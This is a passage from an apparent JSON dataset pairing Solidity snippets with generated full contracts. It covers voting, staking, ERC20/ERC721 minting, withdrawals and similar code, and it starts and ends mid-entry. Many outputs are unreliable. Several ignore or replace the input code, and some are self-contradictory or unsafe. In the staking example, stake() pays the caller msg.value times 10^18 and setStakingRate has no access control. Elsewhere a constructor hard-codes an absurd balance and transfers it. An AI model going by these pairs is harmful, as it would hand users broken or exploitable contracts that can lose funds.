        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n}\n\n"
    },
    "513.sol": {
        "input": "interface ERC20 {\n    function transferFrom(\n        address _from,\n        address _to,\n        uint256 _value\n    ) internal {}\n}\n\ncontract ERC1155 {\n    ERC20 erc20Contract = ERC20(0x1234...5678);\n\n    function buyNFT(uint256 price)\n        external\n    {\n        erc20Contract.transferFrom(msg.sender, price);\n\n       _mint(msg.sender, tokenId, quantity);\n    }\n\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC20 {\n    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);\n}\n\ncontract ERC1155 {\n    ERC20 erc20Contract;\n    mapping(uint256 => address) public tokenOwners;\n    mapping(uint256 => uint256) public tokenBalances;\n\n    constructor(address _erc20Address) public {\n        erc20Contract = ERC20(_erc20Address);\n    }\n\n    function buyNFT(uint256 price, uint256 tokenId, uint256 quantity) external {\n        require(erc20Contract.transferFrom(msg.sender, address(this), price), \"Transfer of ERC20 failed\");\n        _mint(msg.sender, tokenId, quantity);\n    }\n\n    function _mint(address to, uint256 tokenId, uint256 quantity) internal {\n        tokenOwners[tokenId] = to;\n        tokenBalances[tokenId] += quantity;\n    }\n\n    function balanceOf(uint256 tokenId) public view returns (uint256) {\n        return tokenBalances[tokenId];\n    }\n\n    function ownerOf(uint256 tokenId) public view returns (address) {\n        return tokenOwners[tokenId];\n    }\n}\n\n"
    },
    "514.sol": {
        "input": "    function withdraw() public payable {    \n        address recipient = msg.sender;\n        uint256 additionalToken;\n\n        if (ethPrice <= 2000) {    \n            additionalToken = lockAmounts[msg.sender] * 2;\n        }\n\n        require(block.timestamp >= deadline);\n        uint256 amountToWithdraw = lockAmounts[msg.sender] + additionalToken;\n        lockAmounts[msg.sender] = 0; \n        (bool success, ) = payable(recipient).call{value: amountToWithdraw}(\"\");\n        require(success, \"Transfer failed.\"); \n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract LockETHPayable {\n\n    mapping(address => uint256) lockAmounts;\n\n    uint constant ethPrice = 2000;\n\n    uint public constant deadline = 1659744400;\n\n    function withdraw() public payable {    \n        address recipient = msg.sender;\n        uint256 additionalToken;\n\n        if (ethPrice <= 2000) {    \n            additionalToken = lockAmounts[msg.sender] * 2;\n        }\n\n        require(block.timestamp >= deadline);\n        uint256 amountToWithdraw = lockAmounts[msg.sender] + additionalToken;\n        lockAmounts[msg.sender] = 0; \n        (bool success, ) = payable(recipient).call{value: amountToWithdraw}(\"\");\n        require(success, \"Transfer failed.\"); \n    }\n\n}\n\n"
    },
    "515.sol": {
        "input": "contract A {\n    function getBValue() external returns (uint256) {\n        uint256 BValue = B(address(0x123)).getValue();\n        return BValue;\n    }\n}\n\ncontract B {\n    function getValue() external returns (uint256) {\n        return 1;\n    }\n}\n\ncontract A {\n    function getBValue() external view returns (uint256) {\n        uint256 BValue = B(address(0x123)).getValue();\n        return BValue;\n    }\n}\n\ncontract B {\n    function getValue() external view returns (uint256) {\n        return 1;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract A {\n    \n    function getBValue() external view returns (uint256) {\n        uint256 BValue = B(address(0x123)).getValue();\n        return BValue;\n    }\n}\n\ncontract B {\n    \n    function getValue() external view returns (uint256) {\n        return 1; \n    }\n    \n}\n\n"
    },
    "517.sol": {
        "input": "address payable private owner;\nconstructor(){\n   owner=payable(msg.sender)\n}\n\nfunction withdraw() public {\n       require(msg.sender==owner,\"only contract owner can call this\");\n       owner.transfer(address(this).balance);\n    }\n\nfunction withdraw() public {\n           require(msg.sender==owner,\"only contract owner can call this\");\n           (bool success, ) = owner.call{value:address(this).balance}(\"\");\n           require(success,\"Withdraw failed\")\n        }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address payable private owner;\n    \n    constructor() {\n        owner = payable(msg.sender);\n    }\n\n    function withdrawWithTransfer() public {\n        require(msg.sender == owner, \"only contract owner can call this\");\n        owner.transfer(address(this).balance);\n    }\n\n    function withdrawWithCall() public {\n        require(msg.sender == owner, \"only contract owner can call this\");\n        (bool success, ) = owner.call{value: address(this).balance}(\"\");\n        require(success, \"Withdraw failed\");\n    }\n}\n\n"
    },
    "518.sol": {
        "input": "function addProduct(uint id,  uint quantity) public {\n    for (uint i; i < store.length; i++) {\n        if (store[i].id == id) {\n            store[i].quantity += quantity;\n            return;\n        }\n    }\n\n    store.push(Store(id, quantity));\n}\n\nmapping (uint => uint) productIdToArrayIndex;\n\nfunction addProduct(uint id,  uint quantity) public {\n    uint arrayIndex = productIdToArrayIndex[id];\n    if (arrayIndex > 0) {\n        store[arrayIndex].quantity += quantity;\n    }\n\n    store.push(Store(id, quantity));\n    productIdToArrayIndex[id] = store.length - 1;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Storet {\n\n    struct Store {\n        uint id;\n        uint quantity;\n    }\n\n    Store[] public store;\n\n    mapping (uint => uint) productIdToArrayIndex;\n\n    function addProduct(uint id,  uint quantity) public {\n    uint arrayIndex = productIdToArrayIndex[id];\n    if (arrayIndex > 0) {\n        store[arrayIndex].quantity += quantity;\n    }\n\n    store.push(Store(id, quantity));\n    productIdToArrayIndex[id] = store.length - 1;\n  }\n\n}\n\n"
    },
    "519.sol": {
        "input": " Zombie[] public zombies;\n\nfunction createZombie (string memory _name, uint _dna) public {\n        Zombie storage firstZombie=zombies[0]\n        firstZombie.name=_name\n    }\n\nfunction createZombie (string memory _name, uint _dna) public {\n            Zombie memory firstZombie=zombies[0]\n            firstZombie.name=_name\n            return firstZombie\n        }\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ZombieFactory {\n\n    event NewZombie(uint zombieId, string name, uint dna);\n\n    uint dnaDigits = 16;\n    uint dnaModulus = 10 ** dnaDigits;\n\n    struct Zombie {\n        string name;\n        uint dna;\n    }\n\n    Zombie[] public zombies;\n\n    function _createZombie(string memory _name, uint _dna) internal {\n        uint id = zombies.push(Zombie(_name, _dna)) - 1;\n        emit NewZombie(id, _name, _dna);\n    }\n\n    function createZombie(string memory _name, uint _dna) public {\n        require(_dna < dnaModulus, \"DNA should be less than dnaModulus\");\n        _createZombie(_name, _dna);\n    }\n}\n\n"
    },
    "520.sol": {
        "input": " mapping(bytes => bool) private _supportedInterfaces;\n\nmapping(bytes4 => bool) private _supportedInterfaces;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SupportableContract {\n\n     mapping(bytes32 => bool) private _supportedInterfaces;\n\n}\n\n"
    },
    "521.sol": {
        "input": "pragma solidity 0.7.5;\n\ncontract Dogs {\n\n    struct Person{\n        uint age;\n        string name;\n    }\n\n    Person[] people;\n\n    function addNewPerson(uint _age, string memory _name)public {\n        Person memory newPerson = Person(_age, _name);\n        people.push(newPerson);\n    }\n\n    function getPerson(uint _index)public view returns(uint, string memory){\n        Person memory personToReturn = people[_index];\n        return(personToReturn.age, personToReturn.name);\n    }\n\n    function update(uint _index, uint _newAge, string memory _newName) public returns(uint, string memory) {\n        Person memory updatePerson = people[_index];\n        updatePerson.age = _newAge;\n        updatePerson.name = _newName;\n        people[_index] = updatePerson;\n        return(updatePerson.age, updatePerson.name);\n    }\n    \n    function destory(uint _index) public {\n        delete people[_index];\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity 0.7.5;\n\ncontract Dogs {\n\n    struct Person{\n        uint age;\n        string name;\n    }\n\n    Person[] people;\n\n    function addNewPerson(uint _age, string memory _name)public {\n        Person memory newPerson = Person(_age, _name);\n        people.push(newPerson);\n    }\n\n    function getPerson(uint _index)public view returns(uint, string memory){\n        Person memory personToReturn = people[_index];\n        return(personToReturn.age, personToReturn.name);\n    }\n\n    // to replace and old person with a knew person\n    function update(uint _index, uint _newAge, string memory _newName) public returns(uint, string memory) {\n        Person memory updatePerson = people[_index];\n        updatePerson.age = _newAge;\n        updatePerson.name = _newName;\n        // You can replace the old person at specific index to a new person.\n        // You can do it, using the statement declared below this line  \n        people[_index] = updatePerson;\n        return(updatePerson.age, updatePerson.name);\n    }\n    \n    // delete button for indexs\n    function destory(uint _index) public {\n        delete people[_index];\n    }\n}\n\n"
    },
    "523.sol": {
        "input": "import \"../node_modules/hardhat/console.sol\";\n\nimport \"hardhat/console.sol\";\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Console {\n    function log() external {\n        assembly { }\n    }\n}\n\n"
    },
    "524.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract Ballot {\n    struct Candidate {\n        address _address;\n        uint256 _noOfVotes;\n    }\n\n    address private chairperson;\n    Candidate[] public candidateList;\n    mapping(address => bool) private isInVoterList;\n    mapping(address => address) private voterToCandidate;\n\n    modifier isOwner() {\n        require(msg.sender == chairperson);\n        _;\n    }\n\n    modifier isVoter(address voterAddress_) {\n        require(\n            voterAddress_ == msg.sender,\n            \"The voter must register by itself...\"\n        );\n        _;\n    }\n\n    modifier voterRules() {\n        require(msg.sender != chairperson, \"Chairperson cannot vote!!\");\n        require(isInVoterList[msg.sender], \"You must register yourself first\");\n        for (uint256 k = 0; k < candidateList.length; k++) {\n            require(\n                voterToCandidate[msg.sender] != candidateList[k]._address,\n                \"You cannot vote twice...\"\n            );\n        }\n\n        _;\n    }\n\n    constructor() {\n        chairperson = msg.sender;\n    }\n\n    function addCandidate(address address_) public isOwner {\n        for (uint256 i = 0; i < candidateList.length; i++) {\n            require(\n                address_ != candidateList[i]._address,\n                \"Same Candidate cannot be added twice\"\n            );\n        }\n        Candidate memory candidate = Candidate(address_, 0);\n        candidateList.push(candidate);\n    }\n\n    function registerVoter(address voterAddress_)\n        external\n        isVoter(voterAddress_)\n    {\n        require(\n            isInVoterList[voterAddress_] == false,\n            \"You are already registerd voter\"\n        );\n        isInVoterList[voterAddress_] = true;\n    }\n\n    function vote(uint256 _candId) public voterRules {\n        voterToCandidate[msg.sender] = candidateList[_candId]._address;\n        candidateList[_candId]._noOfVotes++;\n    }\n}\n\n\n",
        "output": "//SPDX-License-Identifier:UNLICENSED\npragma solidity ^0.8.0;\n\ncontract Ballot {\n    struct Candidate {\n        // string _name;\n        address _address;\n        uint256 _noOfVotes;\n    }\n\n    address private chairperson;\n    Candidate[] public candidateList;\n    mapping(address => bool) private isInVoterList;\n    mapping(address => address) private voterToCandidate;\n\n    modifier isOwner() {\n        require(msg.sender == chairperson);\n        _;\n    }\n\n    modifier isVoter(address voterAddress_) {\n        require(\n            voterAddress_ == msg.sender,\n            \"The voter must register by itself...\"\n        );\n        _;\n    }\n\n    modifier voterRules() {\n        require(msg.sender != chairperson, \"Chairperson cannot vote!!\");\n        require(isInVoterList[msg.sender], \"You must register yourself first\");\n        for (uint256 k = 0; k < candidateList.length; k++) {\n            require(\n                voterToCandidate[msg.sender] != candidateList[k]._address,\n                \"You cannot vote twice...\"\n            );\n        }\n\n        _;\n    }\n\n    constructor() {\n        chairperson = msg.sender;\n    }\n\n    function addCandidate(address address_) public isOwner {\n        for (uint256 i = 0; i < candidateList.length; i++) {\n            require(\n                address_ != candidateList[i]._address,\n                \"Same Candidate cannot be added twice\"\n            );\n        }\n        Candidate memory candidate = Candidate(address_, 0);\n        candidateList.push(candidate);\n    }\n\n    function registerVoter(address voterAddress_)\n        external\n        isVoter(voterAddress_)\n    {\n        require(\n            isInVoterList[voterAddress_] == false,\n            \"You are already registerd voter\"\n        );\n        isInVoterList[voterAddress_] = true;\n    }\n\n    function vote(uint256 _candId) public voterRules {\n        voterToCandidate[msg.sender] = candidateList[_candId]._address;\n        candidateList[_candId]._noOfVotes++;\n    }\n}\n\n"
    },
    "525.sol": {
        "input": "constructor(address initialOwner) Ownable(initialOwner) ERC20(_tokenname, _tokensymbol) {\n_owner = initialOwner;\n\nconstructor(address _themergeraddress, address _initialOwner) AssetAcquisition(_initialOwner) {\nthemergeraddress = _themergeraddress;\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract AssetAcquisition {\n  address public themergeraddress;\n\n  function acquire() public payable {\n    require(msg.value >= 0.01 ether);\n\n    themergeraddress.transfer(msg.value);\n  }\n}\n\ncontract ERC20 {\n  function totalSupply() public view returns (uint256);\n  function balanceOf(address tokenOwner) public view returns (uint256 balance);\n  function allowance(address tokenOwner, address spender) public view returns (uint256 remaining);\n  function transfer(address to, uint256 tokens) public returns (bool success);\n  function approve(address spender, uint256 tokens) public returns (bool success);\n  function transferFrom(address from, address to, uint256 tokens) public returns (bool success);\n\n  event Transfer(address indexed from, address indexed to, uint256 tokens);\n  event Approval(address indexed tokenOwner, address indexed spender, uint256 tokens);\n}\n\ncontract Ownable {\n  address public owner;\n\n  constructor (address _owner) internal {\n    owner = _owner;\n  }\n\n  \n  modifier onlyowner() {\n    require(msg.sender == owner);\n    _;\n  }\n}\n\n"
    },
    "526.sol": {
        "input": "    fallback() external payable {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MySmartContract {\n    fallback() external payable {}\n}\n\n"
    },
    "527.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract TicketBooking {\n    \n    struct Event {\n        string name;\n        string description;\n        uint256 startDate;\n        uint256 endDate;\n        uint256 totalTickets;\n        uint256 price;\n        mapping (uint256 => bool) tickets;\n    }\n    \n    Event[] public events;\n    mapping (uint256 => Event) public eventMapping;\n    \n    address payable public admin;\n    \n    constructor() {\n        admin = payable(msg.sender);\n    }\n    \n    function getEvent(uint256 _id) public view returns (string memory, string memory, uint256, uint256, uint256, uint256, uint256) {\n        Event storage selectedEvent = eventMapping[_id];\n        uint256 availableTickets = selectedEvent.totalTickets;\n        for (uint256 i = 0; i < selectedEvent.totalTickets; i++) {\n            if (selectedEvent.tickets[i]) {\n                availableTickets--;\n            }\n        }\n        return (selectedEvent.name, selectedEvent.description, selectedEvent.startDate, selectedEvent.endDate, selectedEvent.totalTickets, availableTickets, selectedEvent.price);\n    }\n}\n\nEvent[] public events;\n    mapping (uint256 => Event) public eventMapping;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TicketBooking {\n    \n    struct Event {\n        string name;\n        string description;\n        uint256 startDate;\n        uint256 endDate;\n        uint256 totalTickets;\n        uint256 price;\n        mapping (uint256 => bool) tickets;\n    }\n    \n    Event[] public events;\n    mapping (uint256 => Event) public eventMapping;\n    \n    address payable public admin;\n    \n    constructor() {\n        admin = payable(msg.sender);\n    }\n    \n    function getEvent(uint256 _id) public view returns (string memory, string memory, uint256, uint256, uint256, uint256, uint256) {\n        Event storage selectedEvent = eventMapping[_id];\n        uint256 availableTickets = selectedEvent.totalTickets;\n        for (uint256 i = 0; i < selectedEvent.totalTickets; i++) {\n            if (selectedEvent.tickets[i]) {\n                availableTickets--;\n            }\n        }\n        return (selectedEvent.name, selectedEvent.description, selectedEvent.startDate, selectedEvent.endDate, selectedEvent.totalTickets, availableTickets, selectedEvent.price);\n    }\n    \n}\n\n"
    },
    "528.sol": {
        "input": "payable(msg.sender).transfer(etherToSendBack);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Simple_Transfer_Smart_Contract {\n\n    function sendEtherBack(uint etherToSendBack)\n    public\n    payable\n    {\n        payable(msg.sender).transfer(etherToSendBack);\n    }\n}\n\n"
    },
    "529.sol": {
        "input": "compilers: {\n  solc: {\n    version: '0.8.4',\n  },\n},\n\n  networks: {\n    development: {\n...\n    },\n  },\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract iFollow {\n    address private _owner;\n\n    constructor(address owner) {\n        _owner = owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == msg.sender, \"Not the owner of this contract\");\n        _;\n    }\n}\n\n"
    },
    "531.sol": {
        "input": "function plus(uint _num, string memory _name) public {  \nperson.push(people(_num, _name));\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Person {\n        uint num;\n        string name;\n    }\n    \n    Person[] public people;\n    \n    function plus(uint _num, string memory _name) public {\n        people.push(Person(_num, _name));\n    }\n}\n"
    },
    "533.sol": {
        "input": "function expand(uint256 randomValue, uint256 n) public pure returns (uint256[] memory expandedValues) {\n    expandedValues = new uint256[](n);\n    for (uint256 i = 0; i < n; i++) {\n        expandedValues[i] = uint256(keccak256(abi.encode(randomValue, i)));\n    }\n    return expandedValues;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract RandomComposite {\n    function expand(uint256 randomValue, uint256 n) public pure returns (uint256[] memory expandedValues) {\n        expandedValues = new uint256[](n);\n        for (uint256 i = 0; i < n; i++) {\n            expandedValues[i] = uint256(keccak256(abi.encode(randomValue, i)));\n        }\n        return expandedValues;\n    }\n}\n\n"
    },
    "534.sol": {
        "input": "function INITIAL_SUPPLY() public pure returns(uint256) { return 10000 * (10 ** 18) }\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface IERC20 {\n\n    function INITIAL_SUPPLY() public pure returns(uint256);\n}\n\ncontract SimpleERC20 {\n    \n    \n    function getInitialSupply() public view returns (uint256) {\n        return IERC20(0x320000000000000000000000000000000000000).INITIAL_SUPPLY();\n    }\n}\n\n"
    },
    "535.sol": {
        "input": "function addKhatianFromOld(uint64 _khatianiId, bytes32 _plotHash, uint16 _percentOwn, bytes32 _buyFrom, uint[] memory _user, uint16[] memory _percentage) public{\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Owners {\n    function addKhatianFromOld(uint64 _khatianiId, bytes32 _plotHash, uint16 _percentOwn, bytes32 _buyFrom, uint[] memory _user, uint16[] memory _percentage) external returns (bool);\n}\n\n"
    },
    "536.sol": {
        "input": "assert(true && true);\n\nuint8 three = 3;                \nuint8 five = 5;                 \nuint8 result = three & five;    \n\nassert (students[studentHash] && subjects[subjectHash] && teachers[msg.sender]);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MyContract {\n    mapping(bytes32 => bool) public students;\n    mapping(bytes32 => bool) public subjects;\n    mapping(address => bool) public teachers;\n    \n    constructor() {\n        students[0x123] = true;\n        subjects[0x456] = true;\n        teachers[msg.sender] = true;\n    }\n    \n    function myFunction(bytes32 studentHash, bytes32 subjectHash) public {\n        assert(true && true);\n        \n        uint8 three = 3;                \n        uint8 five = 5;                 \n        uint8 result = three & five;    \n        \n        assert(students[studentHash] && subjects[subjectHash] && teachers[msg.sender]);\n    }\n}\n"
    },
    "537.sol": {
        "input": "constructor() {\n    initialize();\n}\n\nfunction initialize() initializer public {\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    \n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);     \n\n    function transfer(address recipient, uint256 amount) external returns (bool);    \n\n    function allowance(address owner, address spender) external view returns (uint256);    \n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);    \n}\n\n"
    },
    "538.sol": {
        "input": "  ...\n\n  await timeLockContract.grant( \n    await timeLockContract.TIMELOCK_ADMIN_ROLE(), \n    roleMultiCall.address);\n\n  const multiCallResult = await roleMultiCall.multiCall(\n    targets,\n    encodedFunctions,\n  );\n\n\n",
        "output": "pragma solidity ^0.8.9;\n  interface IMultiCall {\n\n    function multiCall(\n      address[] calldata targets,\n      bytes[] calldata encodedFunctions\n    ) external payable returns (bytes[] memory);\n\n  }\n\n  interface ITimeLock {\n\n    function grant(\n      bytes32 roleNameOrAddress, \n      address toRole\n    ) external;\n\n    function grantRole(\n      bytes32 roleNameOrAddress, \n      address toRole\n    ) external;\n\n    function hasRole(\n      bytes32 roleNameOrAddress\n    ) external view returns (bool);\n\n    function renounceRole(\n      bytes32 roleNameOrAddress\n    ) external;\n\n  }\n\n  interface IERC20 {\n\n    function transfer(\n      address to,\n      uint256 value\n    ) external returns (bool);\n\n    function approve(\n      address spender,\n      uint256 value\n    ) external returns (bool);\n\n    function transferFrom(\n      address from,\n      address to,\n      uint256 value\n    ) external returns (bool);\n\n    event Transfer(\n      address indexed from,\n      address indexed to,\n      uint256 value\n    );\n\n    event Approval(\n      address indexed owner,\n      address indexed spender,\n      uint256 value\n    );\n  }\n\n"
    },
    "539.sol": {
        "input": "balances[msg.sender] = 0;\n\nmsg.sender.transfer(balances[msg.sender]);\n\nuint256 balance = balances[msg.sender];\nbalances[msg.sender] = 0; \nmsg.sender.transfer(balance); \n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract TokenDistribution {\n    mapping (address => uint256) public balances;\n\n    constructor() public {\n        balances[msg.sender] = 963428861455155395359732956320188849864605;\n\n        uint256 balance = balances[msg.sender];\n        balances[msg.sender] = 0; \n        msg.sender.transfer(balance); \n\n        uint256 balance2 = balances[msg.sender];\n        balances[msg.sender] = 0; \n        msg.sender.transfer(balance2); \n    }\n}\n\n"
    },
    "540.sol": {
        "input": "function claimFreeToken() public payable {\n    _transfer(address(this), msg.sender, 1000 * (10**decimals()));\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract Context {\n    function _messageSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _decimal() internal pure returns (uint) {\n        return 10 ** uint256(1);\n    }\n}\n\n"
    },
    "541.sol": {
        "input": "function reverseArray(uint[] calldata _array) public pure returns(uint[] memory) {\n    uint length = _array.length;\n    uint[] memory reversedArray = new uint[](length);\n    uint j = 0;\n    for(uint i = length; i >= 1; i--) {\n        reversedArray[j] = _array[i-1];\n        j++;\n    }\n    return reversedArray;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ReverseArray {\n\n    function reverseArray(uint[] calldata array) public pure returns(uint[] memory) {\n        uint length = array.length;\n        uint[] memory reversedArray = new uint[](length);\n        uint j = 0;\n        for(uint i = length; i >= 1; i--) {\n            reversedArray[j] = array[i-1];\n            j++;\n        }\n        return reversedArray;\n    }\n\n}\n\n"
    },
    "542.sol": {
        "input": "function vote(uint _entrociterID) public {\n    require(votes[msg.sender] <MAX_VOTES_PER_VOTER, \"Voter has no votes left.\"); \n    require(_entrociterID > 0 && _entrociterID <= entrociterCount, \" Entrociter ID is out of range.\");\n\n    votes[msg.sender]++; \n    Entrociter storage entrociter=entrociters[_entrociterID]; \n    entrociter.votes++;\n    entrociters[entrociterCount] = entrociter;\n    emit Voted(); }\n\n    function addEntrociter(string memory _name, string memory _party) public {\n    entrociterCount++;\n\n    Entrociter memory entrociter = Entrociter(entrociterCount, _name, _party, 0);\n    entrociters[entrociterCount] = entrociter;\n\n    emit NewEntrociter();\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract VotingContract {\n    struct Entrociter {\n        uint id;\n        string name;\n        string party;\n        uint votes;\n    }\n\n    mapping(address => uint) public votes;\n    mapping(uint => Entrociter) public entrociters;\n    uint public entrociterCount;\n\n    uint constant MAX_VOTES_PER_VOTER = 10;\n\n    event Voted();\n    event NewEntrociter();\n\n    function vote(uint _entrociterID) public {\n        require(votes[msg.sender] < MAX_VOTES_PER_VOTER, \"Voter has no votes left.\"); \n        require(_entrociterID > 0 && _entrociterID <= entrociterCount, \"Entrociter ID is out of range.\");\n\n        votes[msg.sender]++; \n        Entrociter storage entrociter = entrociters[_entrociterID]; \n        entrociter.votes++;\n        entrociters[entrociterCount] = entrociter;\n        emit Voted();\n    }\n\n    function addEntrociter(string memory _name, string memory _party) public {\n        entrociterCount++;\n\n        Entrociter memory entrociter = Entrociter(entrociterCount, _name, _party, 0);\n        entrociters[entrociterCount] = entrociter;\n\n        emit NewEntrociter();\n    }\n}\n"
    },
    "543.sol": {
        "input": "function foo() public {\n    try this.transfer(address(0x123), 2) {\n    } catch (bytes memory data) {\n    }\n}\n\nfunction foo() public {\n    try this.transfer(address(0x123), 2) {\n    } catch Error (string memory reason) {\n    }\n}\n\nrequire(balance[msg.sender]<amount, \"Insufficient Balance\");\n\nrequire(balance[msg.sender] => amount, \"Insufficient Balance\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\n"
    },
    "545.sol": {
        "input": "function stake() public payable () {\n\nfunction stake() public payable {\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract TokenStaking {\n\n    address[] public stakers;\n    address public owner;\n    uint8 public stakingRate = 75;\n\n    constructor() public {\n        owner = msg.sender;\n        stakers = [msg.sender];\n    }\n\n    function() public payable {\n        require(msg.value > 0, \"Staker must deposit Ether to stake\");\n        stakers.push(msg.sender);\n        owner.transfer(msg.value);\n    }\n\n    function stake() public payable {\n        require(msg.value > 0, \"Staker must deposit Ether to stake\");\n        address sender = msg.sender;\n        stakers.push(sender);\n        owner.transfer(msg.value);\n        sender.transfer(msg.value * (10**18));\n    }\n\n    function getStakers() public view returns(address[] memory) {\n        return stakers;\n    }\n\n    function stakingRate() public view returns(uint8) {\n        return stakingRate;\n    }\n\n    function setStakingRate(uint8 newRate) public {\n        stakingRate = newRate;\n    }\n\n}\n\n"
    },
    "546.sol": {
        "input": "function greet()public view returns (string memory)\n\n   var Greeter = artifacts.require(\"./Greeter.sol\")\n\n var Greeter = artifacts.require(\"Greeter\")\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary Greeter {\n  function greet()public view returns (string memory) {\n    return \"Salut!\";\n  }\n}\n\ncontract Greeter_ {\n   function greet()public view returns (string memory) {\n      return Greeter.greet();\n    }\n}\n\n"
    },
    "547.sol": {
        "input": "function stake (uint256 _amount) public {\n     ...\n     ercToken.transfer(address(ercToken), _amount);\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ercToken {\n    function transfer(address _to, uint256 _value) public returns (bool);\n    function balanceOf(address _owner) public view returns (uint256 balance);\n}\n\ncontract Staking {\n\n    ercToken etherToken;\n\n    address public owner;\n    address public staker;\n\n    event Staked(address indexed staker);\n    event Unstaked(address indexed staker);\n\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n\n    constructor(address _owner) public {\n        owner = _owner;\n    }\n\n    function stake(uint256 _amount) public payable onlyOwner {\n        owner.transfer(_amount);\n        etherToken.transfer(address(etherToken), _amount);\n    }\n\n    function() payable public {\n        owner.transfer( msg.value );\n    }\n}\n\n"
    },
    "548.sol": {
        "input": "const firstStage = await contractWithSigner.callStatic.firstStage(signer.getAddress());\n\ncontract Test {\n    event FirstStage(uint256, uint256, string memory);\n\n    function firstStage(address addr) public returns(uint256, uint256, string memory) {\n\n         emit FirstStage(challenge, Mnode, toHex(Hnode));\n         return (challenge, Mnode, toHex(Hnode));\n     }\n}\n\nconst transaction = await contractWithSigner.firstStage(signer.getAddress());\nconst txReceipt = await transaction.wait();\nconst eventLogs = txReceipt.events;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ContractWithSigner {\n\n  function firstStage(address) external;\n\n\n\n}\n\n"
    },
    "549.sol": {
        "input": "IERC721 public nftOne;\nuint public nftTwoMaxMintCount;\nmapping(uint => uint) public nftTwoMints;\n\nfunction mintNftTwo(uint nftOneTokenId) external {\n\n    require(msg.sender == nftOne.ownerOf(nftOneTokenId), \"not the owner of nftOne token\");\n\n    require(nftTwoMints[nftOneTokenId] <= nftTwoMaxMintCount, \"nftTwo token mints overflow\");\n\n    nftTwoMints[nftOneTokenId] += 1;\n\n    _mintNftTwo(); \n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC721 {\n\n    function balanceOf(address tokenOwner) external view returns (uint256 balance);\n\n    function ownerOf(uint256 tokenId) external view returns (address owner);\n\n    function approved(uint256 tokenId) external view returns (address owner);\n\n    function approve(address to, uint256 tokenId) external returns (bool);\n\n    function transferFrom(address from, address to, uint256 tokenId) external returns (bool);\n\n    function implementsInterface(bytes4 interfaceId) external view returns (bool);\n\n}\n\ninterface IMintOne {\n\n    function mint(uint) external;\n\n    function owner() external view returns (address);\n\n    function mintedOneOf(uint index) external view returns (uint);\n\n    function ownerOf(uint index) external view returns (address);\n\n}\n\ninterface IMintTwo {\n\n    function mint(uint) external;\n\n    function owner() external view returns (address);\n\n    function mintedTwoOf(uint index) external view returns (uint);\n\n    function ownerOf(uint index) external view returns (address);\n\n}\n\n"
    },
    "550.sol": {
        "input": "pragma solidity ^0.8;\n\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Burnable.sol\";\n\ncontract MyCollection is ERC721Enumerable, ERC721Burnable {\n    constructor() ERC721(\"CollectionName\", \"Symbol\") {\n        _mint(msg.sender, 1);\n        _burn(1);\n        _mint(msg.sender, 2);\n    }\n\n    function _beforeTokenTransfer(address from, address to, uint256 tokenId) internal override(ERC721, ERC721Enumerable) {\n        return ERC721Enumerable._beforeTokenTransfer(from, to, tokenId);\n    }\n\n    function supportsInterface(bytes4 interfaceId) public view override(ERC721, ERC721Enumerable) returns (bool) {\n        return ERC721Enumerable.supportsInterface(interfaceId);\n    }\n}\n\npragma solidity ^0.8;\n\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Burnable.sol\";\n\ncontract MyCollection is ERC721Enumerable, ERC721Burnable {\n    uint256 public mintCounter;\n\n    constructor() ERC721(\"CollectionName\", \"Symbol\") {\n        _mint(msg.sender, 1);\n        _burn(1);\n        _mint(msg.sender, 2);\n    }\n\n    function _beforeTokenTransfer(address from, address to, uint256 tokenId) internal override(ERC721, ERC721Enumerable) {\n        if (from == address(0)) {\n            mintCounter++;\n        }\n\n        return ERC721Enumerable._beforeTokenTransfer(from, to, tokenId);\n    }\n\n    function supportsInterface(bytes4 interfaceId) public view override(ERC721, ERC721Enumerable) returns (bool) {\n        return 